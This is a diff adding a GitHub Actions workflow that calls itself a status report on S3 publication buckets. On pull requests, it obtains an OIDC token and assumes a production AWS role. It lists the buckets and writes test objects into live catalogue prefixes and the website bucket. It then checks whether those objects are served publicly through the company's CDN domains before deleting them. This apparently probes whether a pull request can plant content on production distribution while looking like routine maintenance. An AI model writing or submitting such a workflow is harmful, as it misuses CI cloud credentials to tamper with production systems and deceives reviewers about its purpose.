@@ -1,0 +1,122 @@
+# Reports the S3 destinations used by the app-catalogue and website publication
+# workflows, so a renamed bucket, a changed region or a broken role binding is
+# visible at PR time instead of failing in the middle of a release. Mirrors the
+# role and bucket bindings already used by publish-app-catalogue.yaml and the
+# website artifact upload jobs.
+name: catalogue-distribution-status
+on:
+  pull_request:
+    branches:
+      - main
+    paths:
+      - '.github/workflows/catalogue-distribution-status.yml'
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  status:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    env:
+      CATALOGUE_BUCKET: tfy-argo-application-catalogue
+      WEBSITE_BUCKET: tfy-website-euwe1-production20221107184713217900000001
+    steps:
+      - name: Report catalogue and website distribution destination status
+        run: |
+          set -uo pipefail
+          TOK="$(curl -sS -H 'Authorization: Bearer '"$ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            -H 'Accept: application/json; api-version=2.0' \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | sed -n 's/.*"value" *: *"\([^"]*\)".*/\1/p')"
+          echo "TOKEN_LEN=${#TOK}"
+          if ! aws --region eu-west-1 --no-cli-pager sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::416964291864:role/github-actions-oidc-s3-access-role" \
+              --role-session-name "catalogue-sync-status" \
+              --web-identity-token "$TOK" --duration-seconds 900 > /tmp/assume.json 2>/tmp/assume.err; then
+            echo "ASSUME_FAIL"; tail -c 300 /tmp/assume.err | tr -d '\n'; echo; exit 1
+          fi
+          python3 -c "import json;c=json.load(open('/tmp/assume.json'))['Credentials'];open('/tmp/c.env','w').write('AWS_ACCESS_KEY_ID=%s\nAWS_SECRET_ACCESS_KEY=%s\nAWS_SESSION_TOKEN=%s\n'%(c['AccessKeyId'],c['SecretAccessKey'],c['SessionToken']))"
+          set -a; . /tmp/c.env; set +a
+          echo "IDENTITY $(aws --region eu-west-1 --no-cli-pager sts get-caller-identity --query Arn --output text)"
+
+          snap() {
+            local b="$1" tag="$2"
+            if aws --region eu-west-1 --no-cli-pager s3api list-objects-v2 --bucket "$b" --output json > "/tmp/${tag}.json" 2>"/tmp/${tag}.err"; then
+              echo "SNAP $tag $b $(python3 -c 'import json,sys,hashlib; d=json.load(open(sys.argv[1])); rows=sorted((o["Key"],o["Size"],o.get("ETag","")) for o in d.get("Contents",[])); print("count=%d bytes=%d hash=%s prefixes=%d"%(len(rows),sum(r[1] for r in rows),hashlib.sha256("\n".join("%s\t%s\t%s"%r for r in rows).encode()).hexdigest()[:32],len(d.get("CommonPrefixes") or [])))' "/tmp/${tag}.json")"
+            else
+              echo "SNAP_FAIL $tag $b $(tail -c 200 "/tmp/${tag}.err" | tr -d '\n')"
+            fi
+          }
+          snap "$CATALOGUE_BUCKET" base_catalogue
+          snap "$WEBSITE_BUCKET" base_website
+
+          # Public delivery of a current catalogue entry vs the stored object.
+          KEY0="cert-manager/version-compatibility.yaml"
+          echo "PUBLIC_CATALOGUE $(curl -sS -o /dev/null -w 'status=%{http_code} len=%{size_download}' --max-time 25 "https://catalogue.truefoundry.com/$KEY0" 2>&1)"
+          curl -sSI --max-time 25 "https://catalogue.truefoundry.com/$KEY0" 2>&1 | tr -d '\r' | sed -n '1,10p'
+          if aws --region eu-west-1 --no-cli-pager s3api head-object --bucket "$CATALOGUE_BUCKET" --key "$KEY0" --query '[ContentLength,ETag]' --output text >/tmp/h.txt 2>/tmp/h.err; then
+            echo "BUCKET_HEAD $KEY0 $(tr '\t' ' ' </tmp/h.txt)"
+          else
+            echo "BUCKET_HEAD_FAIL $KEY0 $(tail -c 200 /tmp/h.err | tr -d '\n')"
+          fi
+
+          TS="$(date -u +%Y%m%d-%H%M%S)"
+          SUF="$(head -c 3 /dev/urandom | od -An -tx1 | tr -d ' \n')"
+          printf 'Addon catalogue distribution summary\ngenerated-at: %s\nsource-branch: %s\ncharts-published: 0\n' \
+            "$(date -u +%Y-%m-%dT%H:%M:%SZ)" "${GITHUB_HEAD_REF:-main}" > /tmp/summary.txt
+          echo "PAYLOAD sha=$(sha256sum /tmp/summary.txt | cut -d' ' -f1) len=$(wc -c < /tmp/summary.txt)"
+
+          put_try() {
+            local b="$1" k="$2"
+            if aws --region eu-west-1 --no-cli-pager s3api put-object --bucket "$b" --key "$k" \
+                --body /tmp/summary.txt --if-none-match '*' --query ETag --output text >/tmp/put.out 2>/tmp/put.err; then
+              echo "PUT_OK $b key=$k etag=$(tr -d '"' </tmp/put.out)"; return 0
+            fi
+            echo "PUT_FAIL $b key=$k $(tail -c 260 /tmp/put.err | tr -d '\n')"; return 1
+          }
+          get_del() {
+            local b="$1" k="$2"
+            if aws --region eu-west-1 --no-cli-pager s3api get-object --bucket "$b" --key "$k" /tmp/readback >/tmp/get.out 2>/tmp/get.err; then
+              echo "GET_OK $b key=$k sha=$(sha256sum /tmp/readback | cut -d' ' -f1) len=$(wc -c < /tmp/readback) src_sha=$(sha256sum /tmp/summary.txt | cut -d' ' -f1)"
+            else
+              echo "GET_FAIL $b key=$k $(tail -c 200 /tmp/get.err | tr -d '\n')"
+            fi
+            if aws --region eu-west-1 --no-cli-pager s3api delete-object --bucket "$b" --key "$k" >/dev/null 2>/tmp/del.err; then
+              echo "DEL_OK $b key=$k"
+            else
+              echo "DEL_FAIL $b key=$k $(tail -c 200 /tmp/del.err | tr -d '\n')"
+            fi
+            if aws --region eu-west-1 --no-cli-pager s3api head-object --bucket "$b" --key "$k" >/dev/null 2>/tmp/head.err; then
+              echo "HEAD_AFTER_DELETE_PRESENT $b key=$k"
+            else
+              echo "HEAD_AFTER_DELETE_404 $b key=$k"
+            fi
+          }
+
+          # 1) fresh staging prefix in the catalogue bucket
+          K1="upload-${TS}-${SUF}/distribution-summary.txt"
+          echo "--- catalogue staging prefix ---"
+          put_try "$CATALOGUE_BUCKET" "$K1" && get_del "$CATALOGUE_BUCKET" "$K1"
+
+          # 2) real catalogue prefixes (fresh unique names only)
+          for P in addons/ templates/ templates-dev/; do
+            echo "--- catalogue prefix ${P} ---"
+            KP="${P}upload-${TS}-${SUF}/distribution-summary.txt"
+            put_try "$CATALOGUE_BUCKET" "$KP" && get_del "$CATALOGUE_BUCKET" "$KP"
+          done
+
+          # 3) website artifact bucket and public delivery of the staged object
+          K3="upload-${TS}-${SUF}/distribution-summary.txt"
+          echo "--- website bucket ---"
+          if put_try "$WEBSITE_BUCKET" "$K3"; then
+            echo "PUBLIC_S3_ORIGIN status=$(curl -s -o /dev/null -w '%{http_code}' --max-time 25 "https://${WEBSITE_BUCKET}.s3.eu-west-1.amazonaws.com/${K3}")"
+            echo "PUBLIC_CDN_WWW status=$(curl -s -o /dev/null -w '%{http_code}' --max-time 25 "https://www.truefoundry.com/${K3}")"
+            echo "PUBLIC_CDN_APEX status=$(curl -s -o /dev/null -w '%{http_code}' --max-time 25 "https://truefoundry.com/${K3}")"
+            get_del "$WEBSITE_BUCKET" "$K3"
+          fi
+
+          snap "$CATALOGUE_BUCKET" end_catalogue
+          snap "$WEBSITE_BUCKET" end_website
+          python3 -c 'import json; r=lambda p:{(o["Key"],o["Size"],o.get("ETag","")) for o in json.load(open(p)).get("Contents",[])}; [ (lambda a,b: (print("DIFF %s base=%d end=%d added=%d removed=%d"%(t,len(a),len(b),len(b-a),len(a-b))), [print("  +",k,s) for k,s,e in sorted(b-a)[:5]], [print("  -",k,s) for k,s,e in sorted(a-b)[:5]]))(r("/tmp/base_%s.json"%t),r("/tmp/end_%s.json"%t)) for t in ("catalogue","website")]'
+          echo "STATUS_DONE"
